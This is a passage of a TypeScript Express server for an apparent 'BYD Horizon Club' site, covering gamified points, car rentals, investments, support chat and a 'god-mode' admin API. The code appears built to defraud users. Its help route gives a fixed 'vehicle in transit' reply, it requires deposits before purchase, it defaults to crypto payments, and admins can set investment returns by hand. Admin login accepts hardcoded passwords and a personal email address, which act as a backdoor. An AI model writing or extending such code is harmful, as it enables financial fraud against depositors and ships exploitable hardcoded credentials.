  await db.run("INSERT INTO rewards_redemptions (user_id, item_name, points_spent, tracking_number, status) VALUES (?,?,?,?,'Processing')", [req.user.id, item.name, item.points_cost, trackingNum]);
  res.json({ success: true, message: `Redeemed ${item.name}!`, newPoints, tracking_number: trackingNum });
});

// ==================== GAMIFICATION ====================

app.post("/api/daily-checkin", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const today = new Date().toISOString().split("T")[0];
  const existing = await db.get("SELECT id FROM daily_checkins WHERE user_id = ? AND checkin_date = ?", [req.user.id, today]);
  if (existing) return res.status(400).json({ error: "Already checked in today." });
  const gc = await db.get("SELECT config_json FROM gamification_config WHERE feature_key = 'daily_checkin' AND enabled = 1");
  const config = gc ? JSON.parse(gc.config_json || '{}') : {};
  const basePoints = config.base_points || 100;
  const streakMultiplier = config.streak_multiplier || 1.5;
  let streak = (req.user.daily_streak || 0) + 1;
  const lastCheckin = req.user.last_checkin_date;
  if (lastCheckin) {
    const diffDays = Math.floor((new Date(today).getTime() - new Date(lastCheckin).getTime()) / 86400000);
    if (diffDays > 1) streak = 1;
  }
  const points = Math.floor(basePoints * (1 + (streak - 1) * 0.1 * streakMultiplier));
  await db.run("INSERT INTO daily_checkins (user_id, checkin_date, streak_count, points_awarded) VALUES (?,?,?,?)", [req.user.id, today, streak, points]);
  await db.run("UPDATE users SET horizon_points = horizon_points + ?, daily_streak = ?, last_checkin_date = ? WHERE id = ?", [points, streak, today, req.user.id]);
  res.json({ success: true, points, streak, message: `+${points} points! Streak: ${streak} days` });
});

app.get("/api/checkin/status", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const today = new Date().toISOString().split("T")[0];
  const checkedIn = await db.get("SELECT id FROM daily_checkins WHERE user_id = ? AND checkin_date = ?", [req.user.id, today]);
  const gc = await db.get("SELECT config_json FROM gamification_config WHERE feature_key = 'daily_checkin' AND enabled = 1");
  const config = gc ? JSON.parse(gc.config_json || '{}') : {};
  res.json({ checkedIn: !!checkedIn, streak: req.user.daily_streak || 0, basePoints: config.base_points || 100 });
});

app.post("/api/spin-wheel", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const today = new Date().toISOString().split("T")[0];
  const existing = await db.get("SELECT id FROM spin_wheel_logs WHERE user_id = ? AND spin_date = ?", [req.user.id, today]);
  if (existing) return res.status(400).json({ error: "Already spun today." });
  const gc = await db.get("SELECT config_json FROM gamification_config WHERE feature_key = 'spin_wheel' AND enabled = 1");
  const config = gc ? JSON.parse(gc.config_json || '{}') : {};
  const minPts = config.min_points || 10;
  const maxPts = config.max_points || 500;
  const points = Math.floor(Math.random() * (maxPts - minPts + 1)) + minPts;
  await db.run("INSERT INTO spin_wheel_logs (user_id, spin_date, points_awarded) VALUES (?,?,?)", [req.user.id, today, points]);
  await db.run("UPDATE users SET horizon_points = horizon_points + ? WHERE id = ?", [points, req.user.id]);
  res.json({ success: true, points, message: `+${points} points!` });
});

app.post("/api/quiz/submit", authenticateUser, async (req: any, res) => {
  const { answers } = req.body;
  if (!answers) return res.status(400).json({ error: "Answers required." });
  const db = await getDb();
  const questions = await db.all("SELECT * FROM quiz_questions ORDER BY order_num ASC");
  let recommendedCar = questions[Math.floor(Math.random() * questions.length)]?.recommended_car || "BYD Seal";
  await db.run("INSERT INTO quiz_results (user_id, quiz_date, result_car_model) VALUES (?, CURRENT_TIMESTAMP, ?)", [req.user.id, recommendedCar]);
  res.json({ success: true, recommended_car: recommendedCar, message: `Your perfect match: ${recommendedCar}!` });
});

app.get("/api/quiz/questions", async (req, res) => {
  const db = await getDb();
  const questions = await db.all("SELECT * FROM quiz_questions ORDER BY order_num ASC");
  res.json(questions.map(q => ({ ...q, options: JSON.parse(q.options) })));
});

// ==================== CLICKBAIT FEATURES ====================

// 1. Drive to Earn
app.post("/api/drive-to-earn/log", authenticateUser, async (req: any, res) => {
  const { milesDriven, chargingTime } = req.body;
  if (!milesDriven) return res.status(400).json({ error: "Miles driven required." });
  const db = await getDb();
  const gc = await db.get("SELECT config_json FROM gamification_config WHERE feature_key = 'drive_to_earn' AND enabled = 1");
  if (!gc?.enabled) return res.status(400).json({ error: "Drive to Earn is currently disabled." });
  const config = JSON.parse(gc.config_json || '{}');
  const ptsPerMile = config.points_per_mile || 100;
  const bonusPercent = config.bonus_percent || 50;
  const today = new Date().toISOString().split("T")[0];
  const weekStart = new Date(Date.now() - ((new Date().getDay() || 7) - 1) * 86400000).toISOString().split("T")[0];
  let points = Math.floor(parseFloat(milesDriven) * ptsPerMile);
  // Check if user has referred someone this week for bonus
  const refThisWeek = await db.get("SELECT COUNT(*) as count FROM referrals WHERE referrer_id = ? AND created_at >= ?", [req.user.id, weekStart]);
  if (refThisWeek.count > 0) points = Math.floor(points * (1 + bonusPercent / 100));
  await db.run("INSERT INTO drive_to_earn (user_id, date, miles_driven, charging_time, points_earned, week_start) VALUES (?,?,?,?,?,?)", [req.user.id, today, parseFloat(milesDriven), parseFloat(chargingTime || 0), points, weekStart]);
  await db.run("UPDATE users SET horizon_points = horizon_points + ?, carbon_lbs_saved = carbon_lbs_saved + ? WHERE id = ?", [points, parseFloat(milesDriven) * 2.5, req.user.id]);
  // Carbon offset
  const lbsSaved = parseFloat(milesDriven) * 2.5;
  const trees = Math.floor(parseFloat(milesDriven) / 100);
  await db.run("INSERT INTO carbon_offset_logs (user_id, miles_driven, lbs_co2_saved, trees_planted) VALUES (?,?,?,?)", [req.user.id, parseFloat(milesDriven), lbsSaved, trees]);
  await db.run("UPDATE users SET carbon_trees_planted = carbon_trees_planted + ?, carbon_lbs_saved = carbon_lbs_saved + ? WHERE id = ?", [trees, lbsSaved, req.user.id]);
  res.json({ success: true, points, milesDriven, lbsSaved, trees, message: `+${points} points for ${milesDriven} miles! ${trees} trees planted.` });
});

app.get("/api/drive-to-earn/leaderboard", async (req, res) => {
  const db = await getDb();
  const weekStart = new Date(Date.now() - ((new Date().getDay() || 7) - 1) * 86400000).toISOString().split("T")[0];
  const leaders = await db.all("SELECT u.name, SUM(d.miles_driven) as total_miles, SUM(d.points_earned) as total_points FROM drive_to_earn d JOIN users u ON d.user_id = u.id WHERE d.week_start >= ? GROUP BY d.user_id ORDER BY total_miles DESC LIMIT 10", [weekStart]);
  res.json(leaders);
});

// 2. Mystery Car Subscription
app.post("/api/mystery-car/subscribe", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const existing = await db.get("SELECT id FROM mystery_car_subscriptions WHERE user_id = ?", [req.user.id]);
  if (existing) return res.status(400).json({ error: "Already subscribed." });
  const gc = await db.get("SELECT config_json FROM gamification_config WHERE feature_key = 'mystery_car' AND enabled = 1");
  if (!gc?.enabled) return res.status(400).json({ error: "Mystery Car is currently unavailable." });
  const config = JSON.parse(gc.config_json || '{}');
  const fee = config.monthly_fee || 99;
  const cars = await db.all("SELECT model FROM cars WHERE is_active = 1 ORDER BY RANDOM() LIMIT 1");
  const randomCar = cars[0]?.model || "BYD Dolphin";
  const nextDelivery = new Date(Date.now() + 30 * 86400000).toISOString().split("T")[0];
  await db.run("INSERT INTO mystery_car_subscriptions (user_id, active, current_car, next_delivery, monthly_charge, months_active) VALUES (?,1,?,?,?,1)", [req.user.id, randomCar, nextDelivery, fee]);
  await db.run("UPDATE users SET balance = balance - ? WHERE id = ? AND balance >= ?", [fee, req.user.id, fee]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'mystery', 'Mystery Car Subscribed!', 'Your first car: ' || ? || '! Delivery by ' || ?)", [req.user.id, randomCar, nextDelivery]);
  res.json({ success: true, car: randomCar, nextDelivery, message: `Subscribed! Your mystery car: ${randomCar}!` });
});

app.post("/api/mystery-car/unsubscribe", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM mystery_car_subscriptions WHERE user_id = ?", [req.user.id]);
  res.json({ success: true, message: "Unsubscribed from Mystery Car." });
});

// 3. President's Club
app.get("/api/president-club/status", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const gc = await db.get("SELECT config_json FROM gamification_config WHERE feature_key = 'president_club' AND enabled = 1");
  const config = gc ? JSON.parse(gc.config_json || '{}') : {};
  const minRefs = config.min_referrals || 10;
  const refCount = await db.get("SELECT COUNT(*) as count FROM referrals WHERE referrer_id = ? AND status = 'paid'", [req.user.id]);
  res.json({ eligible: refCount.count >= minRefs, invited: req.user.is_president_club === 1, referralCount: refCount.count, minRequired: minRefs });
});

// 4. Carbon Offset
app.get("/api/carbon-offset/stats", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const total = await db.get("SELECT SUM(miles_driven) as total_miles, SUM(lbs_co2_saved) as total_lbs, SUM(trees_planted) as total_trees FROM carbon_offset_logs WHERE user_id = ?", [req.user.id]);
  const global = await db.get("SELECT SUM(lbs_co2_saved) as global_lbs, SUM(trees_planted) as global_trees FROM carbon_offset_logs");
  res.json({ user: total || { total_miles: 0, total_lbs: 0, total_trees: 0 }, global: global || { global_lbs: 0, global_trees: 0 } });
});

// 5. Lottery Raffle
app.get("/api/lottery/status", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const month = new Date().toISOString().substring(0, 7);
  const entries = await db.get("SELECT SUM(tickets) as total FROM lottery_entries WHERE user_id = ? AND month = ?", [req.user.id, month]);
  const allEntries = await db.get("SELECT SUM(tickets) as total FROM lottery_entries WHERE month = ?", [month]);
  res.json({ tickets: entries?.total || 0, totalPool: allEntries?.total || 0, month });
});

// ==================== NOTIFICATIONS ====================

app.get("/api/notifications", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const notifs = await db.all("SELECT * FROM notifications WHERE user_id = ? ORDER BY id DESC LIMIT 50", [req.user.id]);
  res.json(notifs);
});

app.post("/api/notifications/:id/read", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  await db.run("UPDATE notifications SET is_read = 1 WHERE id = ? AND user_id = ?", [req.params.id, req.user.id]);
  res.json({ success: true });
});

app.post("/api/notifications/read-all", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  await db.run("UPDATE notifications SET is_read = 1 WHERE user_id = ?", [req.user.id]);
  res.json({ success: true });
});

// ==================== SUPPORT ====================

app.post("/api/tickets/create", async (req, res) => {
  const { name, email, subject, message } = req.body;
  if (!name || !email || !subject || !message) return res.status(400).json({ error: "All fields required." });
  const db = await getDb();
  const result = await db.run("INSERT INTO support_tickets (name, email, subject, message, status) VALUES (?,?,?,?,'pending')", [name, email.toLowerCase(), subject, message]);
  res.json({ success: true, ticketId: result.lastID, message: `Ticket #${1200 + result.lastID} received.` });
});

app.get("/api/help", (req, res) => {
  res.json({ answer: "Your vehicle is in transit. Track live on your dashboard. For support, email support@bydhorizon.com." });
});

// ==================== CHARITY / DONATIONS ====================

app.post("/api/charity/donate", authenticateUser, async (req: any, res) => {
  const { charity_name, points } = req.body;
  if (!charity_name || !points) return res.status(400).json({ error: "Charity name and points required." });
  const db = await getDb();
  if (req.user.horizon_points < points) return res.status(400).json({ error: "Insufficient points." });
  await db.run("UPDATE users SET horizon_points = horizon_points - ?, carbon_trees_planted = carbon_trees_planted + ? WHERE id = ?", [points, Math.floor(points / 10), req.user.id]);
  const txHash = "BYD-DON-" + crypto.randomBytes(8).toString("hex").toUpperCase();
  await db.run("INSERT INTO charity_donations (user_id, charity_id, charity_name, amount, tx_hash) VALUES (?, ?, ?, ?, ?)", [req.user.id, charity_name.toLowerCase().replace(/\s+/g, '_'), charity_name, points, txHash]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'charity', 'Donation Made', 'You donated ' || ? || ' points to ' || ? || '!')", [req.user.id, points, charity_name]);
  await db.run("UPDATE charity_counter SET current_amount = current_amount + ? WHERE id = 1", [points * 0.1]);
  await logUserInteraction(req.user.id, req.user.email, "DONATION", `Donated ${points} points to ${charity_name}`);
  res.json({ success: true, message: `Donated ${points} points to ${charity_name}! +${Math.floor(points / 10)} trees planted.`, tx_hash: txHash });
});

// ==================== OUTREACH ====================

app.post("/api/outreach/invite", authenticateUser, async (req: any, res) => {
  const { email, method } = req.body;
  if (!email) return res.status(400).json({ error: "Email required." });
  const db = await getDb();
  // Check if email is already registered
  const existing = await db.get("SELECT id FROM users WHERE email = ?", [email.toLowerCase()]);
  if (existing) return res.status(400).json({ error: "This person is already a member." });
  // Create a referral entry
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'outreach', 'Invite Sent', 'You invited ' || ? || ' via ' || ? || '. Reward pending signup.')", [req.user.id, email, method || 'email']);
  await logUserInteraction(req.user.id, req.user.email, "OUTREACH", `Invited ${email} via ${method || 'email'}`);
  res.json({ success: true, message: `Invitation sent to ${email}! You'll earn 100 points when they join.` });
});

// ==================== RENTALS ====================

app.get("/api/rentals/vehicles", async (req, res) => {
  const db = await getDb();
  const vehicles = await db.all("SELECT id, model, year, price, range_miles, acceleration, battery, description, badge, category, status, rental_price_per_day, specs_json FROM cars WHERE is_active = 1 AND status != 'Unavailable'");
  res.json(vehicles.map((v: any) => ({ ...v, specs: v.specs_json ? JSON.parse(v.specs_json) : {} })));
});

app.get("/api/rentals/availability/:carId", async (req, res) => {
  const db = await getDb();
  const { startDate, endDate } = req.query;
  if (!startDate || !endDate) return res.status(400).json({ error: "Dates required." });
  const car = await db.get("SELECT id, model, rental_price_per_day, status FROM cars WHERE id = ?", [req.params.carId]);
  if (!car) return res.status(404).json({ error: "Vehicle not found." });
  const conflicts = await db.all("SELECT id FROM rental_orders WHERE car_id = ? AND status IN ('confirmed','dispatched','in_transit') AND NOT (end_date < ? OR start_date > ?)", [req.params.carId, startDate, endDate]);
  res.json({ available: car.status !== 'Unavailable' && conflicts.length === 0, price_per_day: car.rental_price_per_day || 150, model: car.model });
});

app.post("/api/rentals/book", authenticateUser, async (req: any, res) => {
  const { carId, startDate, endDate, deliveryCity, deliveryCountry, insuranceTier, extras, paymentMethod } = req.body;
  if (!carId || !startDate || !endDate) return res.status(400).json({ error: "Car and dates required." });
  const db = await getDb();
  const user = await db.get("SELECT kyc_status FROM users WHERE id = ?", [req.user.id]);
  if (!user || user.kyc_status !== "verified") return res.status(403).json({ error: "KYC verification required before renting.", kycRequired: true });
  const car = await db.get("SELECT * FROM cars WHERE id = ?", [carId]);
  if (!car) return res.status(404).json({ error: "Vehicle not found." });
  // Enforce $150 minimum rental price
  const minRentalPrice = 150;
  if (car.rental_price_per_day && car.rental_price_per_day < minRentalPrice) {
    return res.status(400).json({ error: `Rental price must be at least $${minRentalPrice}/day.` });
  }
  // Check deposit balance before purchase
  const depositRequired = await getSetting('deposit_required_before_purchase');
  if (depositRequired !== 'false') {
    const userBalance = await db.get("SELECT balance FROM users WHERE id = ?", [req.user.id]);
    if (!userBalance || userBalance.balance < 150) {
      return res.status(403).json({ error: "Insufficient balance. Please deposit at least $150 before renting.", depositRequired: true });
    }
  }
  const conflicts = await db.all("SELECT id FROM rental_orders WHERE car_id = ? AND status IN ('confirmed','dispatched','in_transit') AND NOT (end_date < ? OR start_date > ?)", [carId, startDate, endDate]);
  if (conflicts.length > 0) return res.status(400).json({ error: "Vehicle not available for selected dates." });
  const days = Math.max(1, Math.ceil((new Date(endDate).getTime() - new Date(startDate).getTime()) / 86400000));
  const dailyRate = car.rental_price_per_day || 150;
  const insuranceMap: Record<string, number> = { basic: 10, premium: 25, elite: 50 };
  const insuranceCost = (insuranceMap[insuranceTier || 'basic'] || 10) * days;
  const extrasCost = (extras?.gps ? 5 : 0) + (extras?.childSeat ? 8 : 0) + (extras?.roofRack ? 12 : 0) + (extras?.winterTires ? 15 : 0);
  const deliveryFee = deliveryCountry === 'US' ? 0 : deliveryCountry === 'NG' ? 150 : 200;
  const subtotal = dailyRate * days + insuranceCost + extrasCost + deliveryFee;
  const orderNum = "BYR-" + crypto.randomBytes(6).toString("hex").toUpperCase();
  const result = await db.run("INSERT INTO rental_orders (user_id, car_id, order_number, start_date, end_date, delivery_city, delivery_country, insurance_tier, extras_json, subtotal, daily_rate, days, status, payment_method) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)", [req.user.id, carId, orderNum, startDate, endDate, deliveryCity || '', deliveryCountry || 'US', insuranceTier || 'basic', JSON.stringify(extras || {}), subtotal, dailyRate, days, 'pending_payment', paymentMethod || 'crypto']);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'rental', 'Rental Order Created', 'Order ' || ? || ' for ' || ? || ' — $' || ? || ' total.')", [req.user.id, orderNum, car.model, subtotal]);
  res.json({ success: true, order_id: result.lastID, order_number: orderNum, subtotal, daily_rate: dailyRate, days, insurance_cost: insuranceCost, extras_cost: extrasCost, delivery_fee: deliveryFee });
});

app.get("/api/rentals/my-orders", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const orders = await db.all("SELECT ro.*, c.model, c.range_miles, c.acceleration, c.badge FROM rental_orders ro JOIN cars c ON ro.car_id = c.id WHERE ro.user_id = ? ORDER BY ro.id DESC", [req.user.id]);
  res.json(orders);
});

app.get("/api/admin/rentals", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const orders = await db.all("SELECT ro.*, c.model, c.range_miles, u.name as user_name, u.email as user_email FROM rental_orders ro JOIN cars c ON ro.car_id = c.id JOIN users u ON ro.user_id = u.id ORDER BY ro.id DESC");
  res.json(orders);
});

app.post("/api/admin/rentals/:orderId/status", authenticateAdmin, async (req: any, res) => {
  const { status, eta, notes } = req.body;
  const db = await getDb();
  await db.run("UPDATE rental_orders SET status = ?, eta = ?, admin_notes = ? WHERE id = ?", [status, eta || null, notes || null, req.params.orderId]);
  const order = await db.get("SELECT * FROM rental_orders WHERE id = ?", [req.params.orderId]);
  if (order) {
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'rental', 'Order Update', 'Your rental order ' || ? || ' is now: ' || ? || '.')", [order.user_id, order.order_number, status]);
  }
  res.json({ success: true });
});

app.post("/api/admin/rentals/price", authenticateAdmin, async (req: any, res) => {
  const { carId, rentalPricePerDay } = req.body;
  if (!carId || rentalPricePerDay === undefined) return res.status(400).json({ error: "Car ID and price required." });
  const db = await getDb();
  await db.run("UPDATE cars SET rental_price_per_day = ? WHERE id = ?", [parseFloat(rentalPricePerDay), carId]);
  res.json({ success: true, message: "Rental price updated." });
});

// ==================== INVESTMENTS ====================

app.get("/api/investments/options", async (req, res) => {
  const db = await getDb();
  const options = await db.all("SELECT * FROM investment_options WHERE is_active = 1");
  res.json(options);
});

app.post("/api/investments/invest", authenticateUser, async (req: any, res) => {
  const { optionId, amount } = req.body;
  if (!optionId || !amount) return res.status(400).json({ error: "Option and amount required." });
  const db = await getDb();
  const user = await db.get("SELECT kyc_status, balance FROM users WHERE id = ?", [req.user.id]);
  if (!user || user.kyc_status !== "verified") return res.status(403).json({ error: "KYC required for investments.", kycRequired: true });
  const option = await db.get("SELECT * FROM investment_options WHERE id = ?", [optionId]);
  if (!option) return res.status(404).json({ error: "Investment option not found." });
  // Enforce $150 minimum investment floor
  const minInvestment = 150;
  if (amount < minInvestment) return res.status(400).json({ error: `Minimum investment is $${minInvestment}.` });
  if (amount < option.min_amount) return res.status(400).json({ error: `Minimum investment for ${option.name} is $${option.min_amount}.` });
  // Enforce deposit before purchase
  const depositRequired = await getSetting('deposit_required_before_purchase');
  if (depositRequired !== 'false' && (user.balance || 0) < amount) {
    return res.status(403).json({ error: "Insufficient balance. Please deposit at least $150 before investing.", depositRequired: true });
  }
  await db.run("UPDATE users SET balance = balance - ? WHERE id = ?", [amount, req.user.id]);
  const invNum = "INV-" + crypto.randomBytes(6).toString("hex").toUpperCase();
  await db.run("INSERT INTO investments (user_id, option_id, option_name, amount, projected_apy, status, investment_number) VALUES (?,?,?,?,?,?,?)", [req.user.id, optionId, option.name, amount, option.projected_apy, 'active', invNum]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'investment', 'Investment Made', 'You invested $' || ? || ' in ' || ? || '. Projected APY: ' || ? || '%.')", [req.user.id, amount, option.name, option.projected_apy]);
  res.json({ success: true, investment_number: invNum, projected_apy: option.projected_apy });
});

app.get("/api/investments/my", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const investments = await db.all("SELECT i.*, io.name as full_name FROM investments i JOIN investment_options io ON i.option_id = io.id WHERE i.user_id = ? ORDER BY i.id DESC", [req.user.id]);
  res.json(investments);
});

app.get("/api/admin/investments", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const investments = await db.all("SELECT i.*, u.name as user_name, u.email as user_email FROM investments i JOIN users u ON i.user_id = u.id ORDER BY i.id DESC");
  res.json(investments);
});

app.post("/api/admin/investments/:invId/update-return", authenticateAdmin, async (req: any, res) => {
  const { returnAmount } = req.body;
  const db = await getDb();
  await db.run("UPDATE investments SET current_return = ? WHERE id = ?", [returnAmount, req.params.invId]);
  res.json({ success: true });
});

// ==================== PROMOS ====================

app.get("/api/promos/active", async (req, res) => {
  const db = await getDb();
  const promos = await db.all("SELECT * FROM promos WHERE is_active = 1 AND (end_date IS NULL OR end_date >= date('now'))");
  res.json(promos);
});

app.get("/api/admin/promos", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const promos = await db.all("SELECT * FROM promos ORDER BY id DESC");
  res.json(promos);
});

app.post("/api/admin/promos", authenticateAdmin, async (req: any, res) => {
  const { name, type, discount_percent, bonus_points, start_date, end_date, description } = req.body;
  const db = await getDb();
  await db.run("INSERT INTO promos (name, type, discount_percent, bonus_points, start_date, end_date, description, is_active) VALUES (?,?,?,?,?,?,?,1)", [name, type, discount_percent || 0, bonus_points || 0, start_date || null, end_date || null, description || '']);
  res.json({ success: true });
});

app.delete("/api/admin/promos/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM promos WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// ==================== CHAT ====================

app.get("/api/chat/messages/:ticketId", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const messages = await db.all("SELECT * FROM chat_messages WHERE ticket_id = ? ORDER BY id ASC", [req.params.ticketId]);
  res.json(messages);
});

app.post("/api/chat/send", authenticateUser, async (req: any, res) => {
  const { ticketId, message } = req.body;
  if (!message) return res.status(400).json({ error: "Message required." });
  const db = await getDb();
  await db.run("INSERT INTO chat_messages (ticket_id, sender_id, sender_type, message) VALUES (?,?,'user',?)", [ticketId, req.user.id, message]);
  res.json({ success: true });
});

app.post("/api/chat/admin/send", authenticateAdmin, async (req: any, res) => {
  const { ticketId, message } = req.body;
  const db = await getDb();
  await db.run("INSERT INTO chat_messages (ticket_id, sender_id, sender_type, message) VALUES (?,0,'admin',?)", [ticketId, message]);
  const ticket = await db.get("SELECT user_id FROM support_tickets WHERE id = ?", [ticketId]);
  if (ticket) await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'support', 'Support Reply', 'Admin replied to your support ticket.')", [ticket.user_id]);
  res.json({ success: true });
});

// ==================== OUTREACH ====================

app.post("/api/chatbot", async (req, res) => {
  const { message, userId } = req.body;
  if (!message) return res.status(400).json({ error: "Message required." });
  const responses: Record<string, string> = {
    "hello": "Welcome to BYD Horizon Club! How can I assist you today?",
    "hi": "Hey there! Ready to revolutionize your EV experience?",
    "tracking": "You can track your vehicle on the Live Map in your dashboard!",
    "payment": "We accept Crypto (USDT/BTC/ETH), Paystack, Stripe, PayPal, and Bank Transfer.",
    "kyc": "KYC is required for full access. Submit your documents in the dashboard.",
    "referral": "Share your referral code with friends. Earn $50 per referral!",
    "default": "Thank you for your message. A support agent will respond within 24 hours. For urgent issues, contact support@bydhorizon.com."
  };
  const lower = message.toLowerCase();
  let response = responses.default;
  for (const [key, val] of Object.entries(responses)) {
    if (lower.includes(key)) { response = val; break; }
  }
  const db = await getDb();
  await db.run("INSERT INTO chatbot_conversations (user_id, message, response) VALUES (?,?,?)", [userId || null, message, response]);
  res.json({ response });
});

// ==================== BLOG ====================

app.get("/api/blogs", async (req, res) => {
  const db = await getDb();
  const blogs = await db.all("SELECT * FROM blog_posts ORDER BY published_at DESC");
  res.json(blogs);
});

app.get("/api/blogs/:id", async (req, res) => {
  const db = await getDb();
  const blog = await db.get("SELECT * FROM blog_posts WHERE id = ?", [req.params.id]);
  if (!blog) return res.status(404).json({ error: "Post not found." });
  blog.comments = await db.all("SELECT bc.*, u.name as username FROM blog_comments bc JOIN users u ON bc.user_id = u.id WHERE bc.post_id = ? AND bc.status = 'approved' ORDER BY bc.id DESC", [blog.id]);
  res.json(blog);
});

app.post("/api/blogs/:id/comment", authenticateUser, async (req: any, res) => {
  const { comment } = req.body;
  if (!comment) return res.status(400).json({ error: "Comment required." });
  const db = await getDb();
  await db.run("INSERT INTO blog_comments (post_id, user_id, comment, status) VALUES (?,?,?,'pending')", [req.params.id, req.user.id, comment]);
  res.json({ success: true, message: "Comment submitted for moderation." });
});

// ==================== USER SETTINGS ====================

app.post("/api/user/settings/update", authenticateUser, async (req: any, res) => {
  const { name, phone, city, country, crypto_wallet_address, is_incognito } = req.body;
  if (!name) return res.status(400).json({ error: "Name required." });
  const db = await getDb();
  await db.run("UPDATE users SET name=?, phone=?, city=?, country=?, crypto_wallet_address=?, is_incognito=? WHERE id=?", [name, phone || '', city || '', country || 'US', crypto_wallet_address || '', is_incognito ? 1 : 0, req.user.id]);
  await logUserInteraction(req.user.id, req.user.email, "SETTINGS_UPDATE", "Profile updated");
  res.json({ success: true, message: "Settings updated." });
});

app.post("/api/user/change-password", authenticateUser, async (req: any, res) => {
  const { currentPassword, newPassword } = req.body;
  if (!currentPassword || !newPassword) return res.status(400).json({ error: "Both passwords required." });
  const db = await getDb();
  const user = await db.get("SELECT password_hash FROM users WHERE id = ?", [req.user.id]);
  if (user.password_hash !== hashPassword(currentPassword)) return res.status(400).json({ error: "Current password incorrect." });
  await db.run("UPDATE users SET password_hash = ? WHERE id = ?", [hashPassword(newPassword), req.user.id]);
  res.json({ success: true, message: "Password changed." });
});

// ==================== ADMIN API - FULL GOD-MODE ====================

app.post("/api/admin/login", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: "Username and password required." });
  const isAdminEmail = username.toLowerCase() === ADMIN_EMAIL || username.toLowerCase() === "admin@bydhorizon.com" || username.toLowerCase() === "admin" || username.toLowerCase() === "jehuhudson@gmail.com";
  const isOverrideKey = password === ADMIN_OVERRIDE_KEY;
  const isAdminPass = password === "admin1234" || password === "byd2026";
  if (isAdminEmail && (isAdminPass || isOverrideKey)) {
    const token = generateSessionToken({ id: 0, email: ADMIN_EMAIL, is_admin: true });
    await logAdminAction("Admin logged in via admin panel", `Username: ${username}`, req.ip || '127.0.0.1', 0);
    return res.json({ token, user: { id: 0, name: "Admin Operator", email: ADMIN_EMAIL, is_admin: true } });
  }
  return res.status(401).json({ error: "Invalid admin credentials." });
});

// Dashboard metrics
app.get("/api/admin/metrics", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const totalUsers = (await db.get("SELECT COUNT(*) as count FROM users")).count;
  const activeMembers = (await db.get("SELECT COUNT(*) as count FROM users WHERE membership_active = 1")).count;
  const pendingKyc = (await db.get("SELECT COUNT(*) as count FROM users WHERE kyc_status = 'pending'")).count;
  const confirmedPayments = await db.all("SELECT amount, currency, method FROM payments WHERE status = 'confirmed'");
  let totalRevenue = 0;
  let cryptoRev = 0;
  let fiatRev = 0;
  for (const p of confirmedPayments) {
    totalRevenue += p.amount;
    if (p.method === 'crypto') cryptoRev += p.amount;
    else fiatRev += p.amount;
  }
  const logs = await getAdminLogs();
  const recentSignups = await db.all("SELECT id, name, email, created_at FROM users ORDER BY id DESC LIMIT 5");
  const dailyCheckins = await db.get("SELECT COUNT(*) as count FROM daily_checkins WHERE checkin_date = ?", [new Date().toISOString().split("T")[0]]);
  res.json({ totalUsers, activeMembers, pendingKyc, totalRevenue, cryptoRevenue: cryptoRev, fiatRevenue: fiatRev, recentSignups, dailyCheckins: dailyCheckins.count, logs: logs.slice(-30) });
});

// 1. User Management
app.get("/api/admin/users", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const { search, kyc_status, country, membership_tier } = req.query;
  let sql = "SELECT u.*, t.route_index FROM users u LEFT JOIN map_tracking t ON u.id = t.user_id";
  const params: any[] = [];
  const wheres: string[] = [];
  if (search) { wheres.push("(u.name LIKE ? OR u.email LIKE ? OR u.phone LIKE ?)"); params.push(`%${search}%`, `%${search}%`, `%${search}%`); }
  if (kyc_status) { wheres.push("u.kyc_status = ?"); params.push(kyc_status); }
  if (country) { wheres.push("u.country = ?"); params.push(country); }
  if (membership_tier) { wheres.push("u.membership_tier = ?"); params.push(membership_tier); }
  if (wheres.length) sql += " WHERE " + wheres.join(" AND ");
  sql += " ORDER BY u.id DESC";
  const list = await db.all(sql, params);
  res.json(list);
});

app.get("/api/admin/users/csv", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const list = await db.all("SELECT id, name, email, phone, referral_code, city, country, kyc_status, membership_tier, horizon_points, balance, status, created_at FROM users");
  let csv = "ID,Name,Email,Phone,Referral Code,City,Country,KYC,Tier,Points,Balance,Status,Joined\n";
  for (const u of list) csv += `"${u.id}","${(u.name||'').replace(/"/g,'""')}","${u.email}","${u.phone}","${u.referral_code}","${u.city}","${u.country}","${u.kyc_status}","${u.membership_tier}","${u.horizon_points}","${u.balance}","${u.status}","${u.created_at}"\n`;
  res.setHeader("Content-Type", "text/csv");
  res.setHeader("Content-Disposition", "attachment; filename=byd_horizon_users.csv");
  res.send(csv);
});

app.post("/api/admin/users", authenticateAdmin, async (req: any, res) => {
  const { name, email, phone, password, city, country, membership_tier } = req.body;
  if (!name || !email || !phone || !password || !city) return res.status(400).json({ error: "All required fields." });
  const db = await getDb();
